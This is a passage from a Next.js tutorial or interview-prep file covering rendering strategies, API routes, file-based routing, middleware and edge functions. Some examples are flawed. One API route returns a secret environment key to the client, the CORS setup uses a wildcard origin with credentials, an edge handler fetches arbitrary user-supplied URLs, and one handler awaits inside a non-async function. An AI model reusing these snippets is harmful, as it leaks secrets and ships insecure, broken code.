// ✅ Data changes frequently
// ✅ Personalized content (user-specific)
// ✅ Need request data (cookies, headers)
// ✅ Real-time data
// ✅ SEO + fresh data required

// Don't use SSR when:
// ❌ Data doesn't change often (use SSG)
// ❌ Don't need SEO (use CSR)
// ❌ Want maximum performance (use SSG)

// Pros:
// + Always fresh data
// + User-specific content
// + Access to request context
// + Good SEO

// Cons:
// - Slower than SSG (server renders each request)
// - Requires server
// - Higher server costs
// - Can't cache on CDN

2. Static Site Generation (SSG):
---------------------------------

// Pre-renders HTML at build time
// Use getStaticProps

// pages/blog.js
export async function getStaticProps() {
  // Runs at build time
  const posts = await fetchPosts();
  
  return {
    props: { posts },
    // Optional: revalidate makes it ISR (see below)
  };
}

export default function Blog({ posts }) {
  return (
    <div>
      <h1>Blog Posts</h1>
      {posts.map(post => (
        <article key={post.id}>
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
}

// How SSG works:
// 1. Build time: Next.js runs getStaticProps
// 2. Fetches data
// 3. Renders page to HTML
// 4. Saves HTML file to disk
// 5. Deploy to CDN
// 6. User requests page → CDN serves HTML instantly
// 7. React hydrates on client

// Dynamic routes with SSG:
// pages/posts/[slug].js
export async function getStaticPaths() {
  // Generate list of paths at build time
  const posts = await fetchPosts();
  
  const paths = posts.map(post => ({
    params: { slug: post.slug }
  }));
  
  return {
    paths, // e.g., [{ params: { slug: 'post-1' } }, ...]
    fallback: false, // or true, 'blocking'
  };
}

export async function getStaticProps({ params }) {
  // Generate page for each path
  const post = await fetchPost(params.slug);
  
  return {
    props: { post },
  };
}

export default function Post({ post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <div>{post.content}</div>
    </article>
  );
}

// Build output:
// - /posts/post-1.html
// - /posts/post-2.html
// - /posts/post-3.html
// All generated at build time!

// fallback options:

// fallback: false
// - Only paths from getStaticPaths exist
// - 404 for other paths

// fallback: true
// - Paths not in getStaticPaths generated on-demand
// - First request: shows fallback, generates page
// - Subsequent requests: cached page

// fallback: 'blocking'
// - Like true, but waits for page generation
// - No fallback shown, just waits

// Use SSG when:
// ✅ Data doesn't change often
// ✅ Same content for all users
// ✅ SEO important
// ✅ Maximum performance needed
// ✅ Marketing pages, blogs, docs

// Pros:
// + Blazing fast (CDN)
// + Cheap hosting
// + Perfect SEO
// + Scales infinitely

// Cons:
// - Data can be stale
// - Rebuild needed for updates
// - Build time increases with pages

3. Incremental Static Regeneration (ISR):
------------------------------------------

// Best of both worlds: Static + Fresh data
// Use getStaticProps with revalidate

// pages/products.js
export async function getStaticProps() {
  const products = await fetchProducts();
  
  return {
    props: { products },
    revalidate: 60, // Revalidate every 60 seconds
  };
}

export default function Products({ products }) {
  return (
    <div>
      {products.map(product => (
        <div key={product.id}>
          <h2>{product.name}</h2>
          <p>${product.price}</p>
        </div>
      ))}
    </div>
  );
}

// How ISR works:
// 1. Build time: Generate initial HTML
// 2. Deploy to CDN
// 3. User 1 (t=0s): Gets cached HTML (fast!)
// 4. User 2 (t=30s): Gets cached HTML (fast!)
// 5. User 3 (t=70s): Gets cached HTML, triggers regeneration
// 6. Background: Rebuild page with fresh data
// 7. User 4 (t=75s): Gets new HTML with fresh data
// 8. Cache updated

// Timeline visualization:
// Build: Page generated → cached
// 0-60s: All users get cached page
// 61s: User visits, gets cached page, triggers rebuild
// Background: Page regenerates with fresh data
// 65s: New page cached
// 65s+: All users get fresh page
// Repeat cycle...

// On-demand revalidation (Next.js 12.2+):
// pages/api/revalidate.js
export default async function handler(req, res) {
  // Check secret to prevent unauthorized revalidation
  if (req.query.secret !== process.env.REVALIDATE_SECRET) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  try {
    // Revalidate specific path
    await res.revalidate('/posts/my-post');
    return res.json({ revalidated: true });
  } catch (err) {
    return res.status(500).send('Error revalidating');
  }
}

// Trigger from CMS webhook:
// POST /api/revalidate?secret=SECRET&path=/posts/updated-post

// Use ISR when:
// ✅ Data changes occasionally
// ✅ Need both performance and freshness
// ✅ Large number of pages
// ✅ E-commerce products, news, blog posts

// Pros:
// + Fast like SSG (CDN)
// + Fresh data periodically
// + No full rebuild needed
// + Scales well
// + On-demand revalidation

// Cons:
// - Stale data for revalidate period
// - First user after revalidate sees old data
// - Slightly more complex

Comparison Table:
-----------------

// Feature          | SSR           | SSG           | ISR
// -----------------|---------------|---------------|------------------
// Renders          | Per request   | Build time    | Build time + updates
// Speed            | Medium        | Fastest       | Fast
// Data freshness   | Always fresh  | Stale         | Mostly fresh
// Server needed    | Yes           | No (CDN)      | No (CDN)
// Cost             | Higher        | Lowest        | Low
// SEO              | Good          | Perfect       | Perfect
// Personalization  | Yes           | No            | No
// Scalability      | Medium        | Infinite      | Infinite

Real-World Examples:
--------------------

// 1. E-commerce Site

// Homepage - SSG (content rarely changes)
// pages/index.js
export async function getStaticProps() {
  const featured = await fetchFeaturedProducts();
  return { props: { featured } };
}

// Product listing - ISR (prices change, but not constantly)
// pages/products.js
export async function getStaticProps() {
  const products = await fetchProducts();
  return {
    props: { products },
    revalidate: 300, // 5 minutes
  };
}

// Product page - ISR (stock changes, need updates)
// pages/products/[id].js
export async function getStaticPaths() {
  const products = await fetchProducts();
  return {
    paths: products.map(p => ({ params: { id: p.id } })),
    fallback: 'blocking',
  };
}

export async function getStaticProps({ params }) {
  const product = await fetchProduct(params.id);
  return {
    props: { product },
    revalidate: 60, // 1 minute
  };
}

// Cart page - SSR (user-specific)
// pages/cart.js
export async function getServerSideProps({ req }) {
  const session = req.cookies.session;
  const cart = await fetchCart(session);
  return { props: { cart } };
}

// User dashboard - SSR (personalized, authenticated)
// pages/dashboard.js
export async function getServerSideProps({ req }) {
  const user = await authenticate(req);
  if (!user) {
    return { redirect: { destination: '/login', permanent: false } };
  }
  const data = await fetchUserData(user.id);
  return { props: { user, data } };
}

// 2. Blog

// Blog listing - ISR
export async function getStaticProps() {
  const posts = await fetchPosts();
  return {
    props: { posts },
    revalidate: 3600, // 1 hour
  };
}

// Blog post - SSG (content doesn't change)
export async function getStaticProps({ params }) {
  const post = await fetchPost(params.slug);
  return { props: { post } };
}

// Comments section - CSR (client-side fetch)
function Comments({ postId }) {
  const [comments, setComments] = useState([]);
  
  useEffect(() => {
    fetch(`/api/comments?postId=${postId}`)
      .then(r => r.json())
      .then(setComments);
  }, [postId]);
  
  return comments.map(c => <Comment key={c.id} {...c} />);
}

Decision Flow:
--------------

// Does data change per user?
// YES → SSR
// NO ↓

// Does data change frequently (< 1 minute)?
// YES → SSR or CSR
// NO ↓

// Does data change occasionally (minutes/hours)?
// YES → ISR
// NO ↓

// Static content?
// YES → SSG

Mixing Strategies:
------------------

// You can use different strategies on different pages!

// pages/
//   index.js              // SSG (marketing page)
//   about.js              // SSG (rarely changes)
//   blog/
//     index.js            // ISR (new posts periodically)
//     [slug].js           // SSG (posts don't change)
//   products/
//     index.js            // ISR (prices update)
//     [id].js             // ISR (stock updates)
//   dashboard.js          // SSR (user-specific)
//   profile.js            // SSR (personalized)
//   cart.js               // SSR (user cart)

Summary:

SSR (getServerSideProps):
- Renders on every request
- Always fresh data
- User-specific content
- Requires server
- Slower but dynamic

SSG (getStaticProps):
- Pre-rendered at build time
- Blazing fast (CDN)
- Same for all users
- Best for static content
- Perfect SEO

ISR (getStaticProps + revalidate):
- Pre-rendered + periodic updates
- Fast like SSG
- Fresh-ish data
- Best of both worlds
- Great for most use cases
*/


/**
87. What are API routes in Next.js?
-----------------------------------

API routes provide a solution to build your API directly within your Next.js app.
Any file inside pages/api folder is treated as an API endpoint instead of a page.

Basic API Route:
----------------

// pages/api/hello.js
export default function handler(req, res) {
  res.status(200).json({ message: 'Hello from Next.js!' });
}

// Access at: http://localhost:3000/api/hello
// Returns: { "message": "Hello from Next.js!" }

// No Express or other framework needed!

Request and Response:
---------------------

// pages/api/users.js
export default function handler(req, res) {
  // Request object
  const {
    method,        // HTTP method: GET, POST, etc.
    query,         // Query parameters: ?name=John
    body,          // Request body (POST/PUT)
    cookies,       // Cookies
    headers,       // Headers
  } = req;
  
  // Response methods
  res.status(200);                    // Set status code
  res.json({ data: 'value' });       // Send JSON
  res.send('Text response');         // Send text
  res.redirect('/other-page');       // Redirect
  res.setHeader('Custom', 'value');  // Set header
  
  // Common pattern
  res.status(200).json({ success: true });
}

HTTP Methods:
-------------

// pages/api/posts.js
export default function handler(req, res) {
  const { method } = req;
  
  switch (method) {
    case 'GET':
      // Handle GET request
      const posts = await getPosts();
      res.status(200).json(posts);
      break;
      
    case 'POST':
      // Handle POST request
      const { title, content } = req.body;
      const newPost = await createPost({ title, content });
      res.status(201).json(newPost);
      break;
      
    case 'PUT':
      // Handle PUT request
      const { id } = req.query;
      const updated = await updatePost(id, req.body);
      res.status(200).json(updated);
      break;
      
    case 'DELETE':
      // Handle DELETE request
      const { id } = req.query;
      await deletePost(id);
      res.status(204).end();
      break;
      
    default:
      res.setHeader('Allow', ['GET', 'POST', 'PUT', 'DELETE']);
      res.status(405).end(`Method ${method} Not Allowed`);
  }
}

Dynamic API Routes:
-------------------

// pages/api/posts/[id].js
export default async function handler(req, res) {
  const { id } = req.query;  // Get dynamic parameter
  
  if (req.method === 'GET') {
    const post = await getPost(id);
    
    if (!post) {
      return res.status(404).json({ error: 'Post not found' });
    }
    
    res.status(200).json(post);
  }
  
  if (req.method === 'DELETE') {
    await deletePost(id);
    res.status(204).end();
  }
}

// Access:
// GET /api/posts/123 → { id: '123' }
// DELETE /api/posts/456 → { id: '456' }

Catch-All API Routes:
---------------------

// pages/api/[...params].js
export default function handler(req, res) {
  const { params } = req.query;
  
  // /api/a → params = ['a']
  // /api/a/b → params = ['a', 'b']
  // /api/a/b/c → params = ['a', 'b', 'c']
  
  res.json({ params });
}

// Optional catch-all:
// pages/api/[[...params]].js
// Matches /api and /api/anything/...

Database Integration:
---------------------

// pages/api/users/[id].js
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

export default async function handler(req, res) {
  const { id } = req.query;
  
  try {
    if (req.method === 'GET') {
      const user = await prisma.user.findUnique({
        where: { id: parseInt(id) }
      });
      
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }
      
      res.status(200).json(user);
    }
    
    if (req.method === 'PUT') {
      const user = await prisma.user.update({
        where: { id: parseInt(id) },
        data: req.body
      });
      
      res.status(200).json(user);
    }
    
    if (req.method === 'DELETE') {
      await prisma.user.delete({
        where: { id: parseInt(id) }
      });
      
      res.status(204).end();
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}

Authentication:
---------------

// pages/api/protected.js
import { verify } from 'jsonwebtoken';

export default async function handler(req, res) {
  // Get token from header
  const token = req.headers.authorization?.replace('Bearer ', '');
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    // Verify token
    const decoded = verify(token, process.env.JWT_SECRET);
    
    // Get user data
    const user = await getUser(decoded.userId);
    
    res.status(200).json({ user });
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

Middleware Pattern:
-------------------

// lib/middleware.js
export function withAuth(handler) {
  return async (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    try {
      const user = await verifyToken(token);
      req.user = user;  // Attach user to request
      return handler(req, res);
    } catch (error) {
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}

// pages/api/dashboard.js
import { withAuth } from '../../lib/middleware';

async function handler(req, res) {
  // req.user is available here
  const data = await getDashboardData(req.user.id);
  res.json(data);
}

export default withAuth(handler);

File Upload:
------------

// pages/api/upload.js
import formidable from 'formidable';
import fs from 'fs/promises';

export const config = {
  api: {
    bodyParser: false,  // Disable default body parser
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }
  
  const form = formidable({ multiples: true });
  
  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(500).json({ error: 'Upload failed' });
    }
    
    const file = files.file;
    const data = await fs.readFile(file.filepath);
    
    // Save to cloud storage or process
    const url = await uploadToS3(data, file.originalFilename);
    
    res.status(200).json({ url });
  });
}

CORS Configuration:
-------------------

// pages/api/public.js
export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  // Your API logic
  res.json({ message: 'CORS enabled' });
}

Real-World Example - Complete CRUD API:
----------------------------------------

// pages/api/todos/index.js
import { getTodos, createTodo } from '../../../lib/db';

export default async function handler(req, res) {
  try {
    if (req.method === 'GET') {
      const { userId } = req.query;
      const todos = await getTodos(userId);
      return res.status(200).json(todos);
    }
    
    if (req.method === 'POST') {
      const { text, userId } = req.body;
      
      if (!text) {
        return res.status(400).json({ error: 'Text is required' });
      }
      
      const todo = await createTodo({ text, userId, completed: false });
      return res.status(201).json(todo);
    }
    
    res.status(405).end();
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

// pages/api/todos/[id].js
import { getTodo, updateTodo, deleteTodo } from '../../../lib/db';

export default async function handler(req, res) {
  const { id } = req.query;
  
  try {
    if (req.method === 'GET') {
      const todo = await getTodo(id);
      
      if (!todo) {
        return res.status(404).json({ error: 'Todo not found' });
      }
      
      return res.status(200).json(todo);
    }
    
    if (req.method === 'PUT') {
      const todo = await updateTodo(id, req.body);
      return res.status(200).json(todo);
    }
    
    if (req.method === 'DELETE') {
      await deleteTodo(id);
      return res.status(204).end();
    }
    
    res.status(405).end();
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

// Use from frontend:
// pages/index.js
function TodoApp() {
  const [todos, setTodos] = useState([]);
  
  // Fetch todos
  useEffect(() => {
    fetch('/api/todos?userId=1')
      .then(r => r.json())
      .then(setTodos);
  }, []);
  
  // Create todo
  const addTodo = async (text) => {
    const response = await fetch('/api/todos', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text, userId: 1 })
    });
    const newTodo = await response.json();
    setTodos([...todos, newTodo]);
  };
  
  // Update todo
  const toggleTodo = async (id, completed) => {
    await fetch(`/api/todos/${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ completed: !completed })
    });
    setTodos(todos.map(t => t.id === id ? {...t, completed: !completed} : t));
  };
  
  // Delete todo
  const deleteTodo = async (id) => {
    await fetch(`/api/todos/${id}`, { method: 'DELETE' });
    setTodos(todos.filter(t => t.id !== id));
  };
  
  return (
    <div>
      {todos.map(todo => (
        <div key={todo.id}>
          <input
            type="checkbox"
            checked={todo.completed}
            onChange={() => toggleTodo(todo.id, todo.completed)}
          />
          <span>{todo.text}</span>
          <button onClick={() => deleteTodo(todo.id)}>Delete</button>
        </div>
      ))}
    </div>
  );
}

API Route Features:
-------------------

// 1. Environment Variables
export default function handler(req, res) {
  const apiKey = process.env.API_KEY;  // Server-side only
  res.json({ key: apiKey });
}

// 2. No CORS issues
// Same origin as frontend

// 3. Server-side only code
import bcrypt from 'bcrypt';  // Won't be in client bundle

export default async function handler(req, res) {
  const hash = await bcrypt.hash(req.body.password, 10);
  res.json({ hash });
}

// 4. Edge Runtime (experimental)
export const config = {
  runtime: 'edge',  // Runs on edge locations
};

export default async function handler(req) {
  return new Response('Hello from edge!');
}

Benefits:
---------

// ✅ Full-stack in one project
// ✅ No CORS configuration
// ✅ Serverless by default
// ✅ Automatic code splitting
// ✅ TypeScript support
// ✅ Easy deployment
// ✅ Same domain as frontend
// ✅ Can use server-side packages

Summary:

API Routes:
- Backend API in pages/api folder
- Each file = API endpoint
- Supports all HTTP methods
- Dynamic routes with [param]
- Database integration
- Authentication & middleware
- File uploads
- Serverless functions
- Deploy with your app
- No separate backend needed
*/


/**
88. How does file-based routing work?
-------------------------------------

Next.js uses a file-based routing system where the file structure in the pages
directory automatically becomes your application's routes. No react-router needed!

Basic Routing:
--------------

// File system:
pages/
  index.js          → /
  about.js          → /about
  contact.js        → /contact
  blog.js           → /blog

// pages/index.js
export default function Home() {
  return <h1>Home Page</h1>;
}
// URL: http://localhost:3000/

// pages/about.js
export default function About() {
  return <h1>About Page</h1>;
}
// URL: http://localhost:3000/about

Nested Routes:
--------------

// File system:
pages/
  blog/
    index.js        → /blog
    first-post.js   → /blog/first-post
    second-post.js  → /blog/second-post

// pages/blog/index.js
export default function BlogHome() {
  return <h1>Blog Home</h1>;
}
// URL: /blog

// pages/blog/first-post.js
export default function FirstPost() {
  return <h1>First Post</h1>;
}
// URL: /blog/first-post

Dynamic Routes:
---------------

// File system:
pages/
  posts/
    [id].js         → /posts/:id
    [slug].js       → /posts/:slug

// pages/posts/[id].js
import { useRouter } from 'next/router';

export default function Post() {
  const router = useRouter();
  const { id } = router.query;  // Get dynamic parameter
  
  return <h1>Post ID: {id}</h1>;
}

// URLs:
// /posts/1 → id = '1'
// /posts/2 → id = '2'
// /posts/abc → id = 'abc'

// With getStaticProps:
export async function getStaticPaths() {
  return {
    paths: [
      { params: { id: '1' } },
      { params: { id: '2' } },
      { params: { id: '3' } }
    ],
    fallback: false
  };
}

export async function getStaticProps({ params }) {
  const post = await fetchPost(params.id);
  return { props: { post } };
}

export default function Post({ post }) {
  return <h1>{post.title}</h1>;
}

Catch-All Routes:
-----------------

// File system:
pages/
  docs/
    [...slug].js    → /docs/* (any depth)

// pages/docs/[...slug].js
import { useRouter } from 'next/router';

export default function Docs() {
  const router = useRouter();
  const { slug } = router.query;
  
  // slug is an array
  return <h1>Docs: {slug?.join('/')}</h1>;
}

// URLs:
// /docs/a → slug = ['a']
// /docs/a/b → slug = ['a', 'b']
// /docs/a/b/c → slug = ['a', 'b', 'c']

// Optional catch-all:
// pages/docs/[[...slug]].js
// Matches /docs and /docs/anything/...

// URLs:
// /docs → slug = undefined
// /docs/a → slug = ['a']
// /docs/a/b → slug = ['a', 'b']

Link Component:
---------------

import Link from 'next/link';

function Navigation() {
  return (
    <nav>
      <Link href="/">Home</Link>
      <Link href="/about">About</Link>
      <Link href="/blog">Blog</Link>
      <Link href="/posts/1">Post 1</Link>
    </nav>
  );
}

// Dynamic links:
function PostList({ posts }) {
  return posts.map(post => (
    <Link key={post.id} href={`/posts/${post.id}`}>
      <a>{post.title}</a>
    </Link>
  ));
}

// Link with object:
<Link href={{
  pathname: '/posts/[id]',
  query: { id: post.id }
}}>
  <a>{post.title}</a>
</Link>

Programmatic Navigation:
------------------------

import { useRouter } from 'next/router';

function Component() {
  const router = useRouter();
  
  // Navigate to page
  const goToAbout = () => {
    router.push('/about');
  };
  
  // Navigate with params
  const goToPost = (id) => {
    router.push(`/posts/${id}`);
    // or
    router.push({
      pathname: '/posts/[id]',
      query: { id }
    });
  };
  
  // Replace (no history entry)
  const replaceRoute = () => {
    router.replace('/new-page');
  };
  
  // Go back
  const goBack = () => {
    router.back();
  };
  
  // Reload current page
  const reload = () => {
    router.reload();
  };
  
  // Prefetch page
  useEffect(() => {
    router.prefetch('/about');
  }, []);
  
  return (
    <div>
      <button onClick={goToAbout}>About</button>
      <button onClick={() => goToPost(123)}>Post 123</button>
      <button onClick={goBack}>Back</button>
    </div>
  );
}

Query Parameters:
-----------------

// URL: /search?q=react&sort=date
import { useRouter } from 'next/router';

function SearchPage() {
  const router = useRouter();
  const { q, sort } = router.query;
  
  return (
    <div>
      <p>Search: {q}</p>
      <p>Sort: {sort}</p>
    </div>
  );
}

// Update query:
function updateQuery() {
  router.push({
    pathname: '/search',
    query: { q: 'nextjs', sort: 'relevance' }
  });
}

Shallow Routing:
----------------

// Update URL without running data fetching methods
function Page() {
  const router = useRouter();
  
  const updateFilter = (filter) => {
    router.push(
      {
        pathname: '/products',
        query: { filter }
      },
      undefined,
      { shallow: true }  // Don't re-run getStaticProps/getServerSideProps
    );
  };
  
  return (
    <div>
      <button onClick={() => updateFilter('electronics')}>Electronics</button>
      <button onClick={() => updateFilter('clothing')}>Clothing</button>
    </div>
  );
}

Route Groups (App Router - Next.js 13+):
-----------------------------------------

// Organize routes without affecting URL
app/
  (marketing)/
    about/
      page.js       → /about
    blog/
      page.js       → /blog
  (shop)/
    products/
      page.js       → /products
    cart/
      page.js       → /cart
  page.js           → /

// (folder) doesn't appear in URL
// Used for organization only

Parallel Routes (App Router):
------------------------------

// Show multiple pages at same URL
app/
  @modal/
    login/
      page.js
  @sidebar/
    page.js
  layout.js
  page.js

// layout.js
export default function Layout({ children, modal, sidebar }) {
  return (
    <div>
      <aside>{sidebar}</aside>
      <main>{children}</main>
      {modal}
    </div>
  );
}

Intercepting Routes (App Router):
----------------------------------

// Intercept navigation to show modal instead
app/
  photos/
    [id]/
      page.js           → /photos/123 (direct visit)
  (..)photos/
    [id]/
      page.js           → /photos/123 (intercepted from within app)

// Show photo in modal when clicking link
// Show full page when visiting directly

Custom 404 Page:
----------------

// pages/404.js
export default function Custom404() {
  return (
    <div>
      <h1>404 - Page Not Found</h1>
      <p>The page you're looking for doesn't exist.</p>
      <Link href="/">Go home</Link>
    </div>
  );
}

Custom 500 Page:
----------------

// pages/500.js
export default function Custom500() {
  return (
    <div>
      <h1>500 - Server Error</h1>
      <p>Something went wrong on our end.</p>
    </div>
  );
}

Custom App:
-----------

// pages/_app.js
// Wraps all pages
import '../styles/globals.css';

export default function MyApp({ Component, pageProps }) {
  return (
    <div>
      <nav>{/* Navigation * /}</nav>
      <Component {...pageProps} />
      <footer>{/* Footer * /}</footer>
    </div>
  );
}

Custom Document:
----------------

// pages/_document.js
// Customize HTML document
import { Html, Head, Main, NextScript } from 'next/document';

export default function Document() {
  return (
    <Html lang="en">
      <Head>
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <body>
        <Main />
        <NextScript />
      </body>
    </Html>
  );
}

Complete Routing Example:
--------------------------

// File system:
pages/
  _app.js                    // Custom App
  _document.js               // Custom Document
  404.js                     // Custom 404
  index.js                   // /
  about.js                   // /about
  blog/
    index.js                 // /blog
    [slug].js                // /blog/:slug
  posts/
    index.js                 // /posts
    [id].js                  // /posts/:id
    [id]/
      edit.js                // /posts/:id/edit
      comments.js            // /posts/:id/comments
  docs/
    [[...slug]].js           // /docs/* (optional catch-all)
  api/
    hello.js                 // /api/hello
    posts/
      [id].js                // /api/posts/:id

// Navigation component:
function Navigation() {
  const router = useRouter();
  
  return (
    <nav>
      <Link href="/">
        <a className={router.pathname === '/' ? 'active' : ''}>
          Home
        </a>
      </Link>
      
      <Link href="/about">
        <a className={router.pathname === '/about' ? 'active' : ''}>
          About
        </a>
      </Link>
      
      <Link href="/blog">
        <a className={router.pathname.startsWith('/blog') ? 'active' : ''}>
          Blog
        </a>
      </Link>
    </nav>
  );
}

Routing Best Practices:
------------------------

// 1. Use Link for navigation (not <a>)
// ✅ Good
<Link href="/about"><a>About</a></Link>

// ❌ Bad
<a href="/about">About</a>  // Full page reload!

// 2. Prefetch important routes
<Link href="/important" prefetch={true}>
  <a>Important Page</a>
</Link>

// 3. Use dynamic imports for heavy components
const HeavyComponent = dynamic(() => import('../components/Heavy'), {
  loading: () => <p>Loading...</p>
});

// 4. Keep route structure flat when possible
// ✅ Good
pages/blog-post.js

// ❌ Avoid unnecessary nesting
pages/blog/post.js  // If blog only has one type

// 5. Use meaningful names
// ✅ Good
pages/products/[id].js

// ❌ Bad
pages/p/[i].js

Summary:

File-Based Routing:
- pages/ folder = routes
- index.js = root of directory
- [param].js = dynamic route
- [...slug].js = catch-all route
- [[...slug]].js = optional catch-all
- _app.js = custom App component
- _document.js = custom HTML document
- 404.js = custom 404 page
- Automatic code splitting
- Link component for navigation
- useRouter hook for programmatic navigation
- No configuration needed
*/

// Continuing with remaining questions...

/**
89. What are middleware and edge functions?
------------------------------------------

Middleware in Next.js allows you to run code before a request is completed. Edge
functions run at the edge (CDN locations) closer to users for better performance.

Middleware:
-----------

// middleware.js (or middleware.ts)
// Runs before every request

import { NextResponse } from 'next/server';

export function middleware(request) {
  // Get pathname
  const { pathname } = request.nextUrl;
  
  // Check authentication
  const token = request.cookies.get('token');
  
  if (pathname.startsWith('/dashboard') && !token) {
    // Redirect to login
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  // Continue to page
  return NextResponse.next();
}

// Configure which paths middleware runs on
export const config = {
  matcher: ['/dashboard/:path*', '/profile/:path*'],
};

Middleware Use Cases:
---------------------

// 1. Authentication
export function middleware(request) {
  const token = request.cookies.get('auth-token');
  
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  return NextResponse.next();
}

// 2. Redirects
export function middleware(request) {
  const { pathname } = request.nextUrl;
  
  // Old URL to new URL
  if (pathname === '/old-blog') {
    return NextResponse.redirect(new URL('/blog', request.url));
  }
  
  // Redirect based on condition
  if (pathname === '/admin' && !isAdmin(request)) {
    return NextResponse.redirect(new URL('/', request.url));
  }
  
  return NextResponse.next();
}

// 3. Rewriting (URL stays same, content different)
export function middleware(request) {
  const { pathname } = request.nextUrl;
  
  // Show different page without changing URL
  if (pathname === '/about') {
    return NextResponse.rewrite(new URL('/about-us', request.url));
  }
  
  return NextResponse.next();
}

// 4. Geolocation-based content
export function middleware(request) {
  const country = request.geo.country;
  
  // Redirect based on country
  if (country === 'US' && !request.nextUrl.pathname.startsWith('/us')) {
    return NextResponse.redirect(new URL('/us', request.url));
  }
  
  if (country === 'UK' && !request.nextUrl.pathname.startsWith('/uk')) {
    return NextResponse.redirect(new URL('/uk', request.url));
  }
  
  return NextResponse.next();
}

// 5. A/B Testing
export function middleware(request) {
  // Random variant
  const variant = Math.random() < 0.5 ? 'a' : 'b';
  
  // Set cookie
  const response = NextResponse.next();
  response.cookies.set('ab-test-variant', variant);
  
  // Rewrite to variant page
  if (request.nextUrl.pathname === '/landing') {
    return NextResponse.rewrite(
      new URL(`/landing-${variant}`, request.url)
    );
  }
  
  return response;
}

// 6. Custom Headers
export function middleware(request) {
  const response = NextResponse.next();
  
  // Add custom headers
  response.headers.set('X-Custom-Header', 'value');
  response.headers.set('X-Request-Time', Date.now().toString());
  
  return response;
}

// 7. Rate Limiting
const rateLimit = new Map();

export function middleware(request) {
  const ip = request.ip || 'unknown';
  const now = Date.now();
  
  // Get user's request history
  const userRequests = rateLimit.get(ip) || [];
  
  // Filter requests in last minute
  const recentRequests = userRequests.filter(time => now - time < 60000);
  
  // Check limit
  if (recentRequests.length >= 100) {
    return new NextResponse('Rate limit exceeded', { status: 429 });
  }
  
  // Update history
  recentRequests.push(now);
  rateLimit.set(ip, recentRequests);
  
  return NextResponse.next();
}

// 8. Bot Protection
export function middleware(request) {
  const userAgent = request.headers.get('user-agent') || '';
  
  // Block known bots
  const botPatterns = ['bot', 'crawler', 'spider', 'scraper'];
  const isBot = botPatterns.some(pattern => 
    userAgent.toLowerCase().includes(pattern)
  );
  
  if (isBot && request.nextUrl.pathname.startsWith('/api')) {
    return new NextResponse('Forbidden', { status: 403 });
  }
  
  return NextResponse.next();
}

Middleware Configuration:
--------------------------

// Match specific paths
export const config = {
  matcher: '/dashboard/:path*',
};

// Match multiple paths
export const config = {
  matcher: ['/dashboard/:path*', '/profile/:path*'],
};

// Match all except specific
export const config = {
  matcher: [
    /*
     * Match all request paths except:
     * - api (API routes)
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     * /
    '/((?!api|_next/static|_next/image|favicon.ico).*)',
  ],
};

Edge Functions:
---------------

// Edge functions run at CDN edge locations
// Near users for low latency

// pages/api/edge-example.js
export const config = {
  runtime: 'edge',  // Enable edge runtime
};

export default async function handler(request) {
  // Get user location
  const { geo } = request;
  
  return new Response(
    JSON.stringify({
      country: geo.country,
      city: geo.city,
      region: geo.region,
      latitude: geo.latitude,
      longitude: geo.longitude,
    }),
    {
      status: 200,
      headers: {
        'content-type': 'application/json',
      },
    }
  );
}

// Benefits:
// - Runs globally at edge
// - Low latency (~50ms)
// - Scales automatically
// - No cold starts

Edge Function Examples:
-----------------------

// 1. Personalization
export const config = { runtime: 'edge' };

export default async function handler(request) {
  const country = request.geo.country;
  
  // Personalized content based on location
  const content = {
    US: 'Welcome, American visitor!',
    UK: 'Welcome, British visitor!',
    default: 'Welcome, international visitor!'
  };
  
  return new Response(content[country] || content.default);
}

// 2. Feature Flags
export const config = { runtime: 'edge' };

const features = {
  'new-ui': ['US', 'CA'],
  'beta-feature': ['US'],
};

export default async function handler(request) {
  const country = request.geo.country;
  const enabledFeatures = {};
  
  for (const [feature, countries] of Object.entries(features)) {
    enabledFeatures[feature] = countries.includes(country);
  }
  
  return new Response(JSON.stringify(enabledFeatures), {
    headers: { 'content-type': 'application/json' },
  });
}

// 3. Image Transformation
export const config = { runtime: 'edge' };

export default async function handler(request) {
  const { searchParams } = new URL(request.url);
  const imageUrl = searchParams.get('url');
  const width = searchParams.get('width') || 800;
  
  // Fetch and transform image at edge
  const response = await fetch(imageUrl);
  const image = await response.arrayBuffer();
  
  // Transform image (using edge-compatible library)
  const transformed = await transformImage(image, { width });
  
  return new Response(transformed, {
    headers: {
      'content-type': 'image/jpeg',
      'cache-control': 'public, max-age=31536000',
    },
  });
}

// 4. API Gateway
export const config = { runtime: 'edge' };

export default async function handler(request) {
  const { pathname } = new URL(request.url);
  
  // Route to different backends
  const routes = {
    '/api/users': 'https://users-api.com',
    '/api/posts': 'https://posts-api.com',
    '/api/comments': 'https://comments-api.com',
  };
  
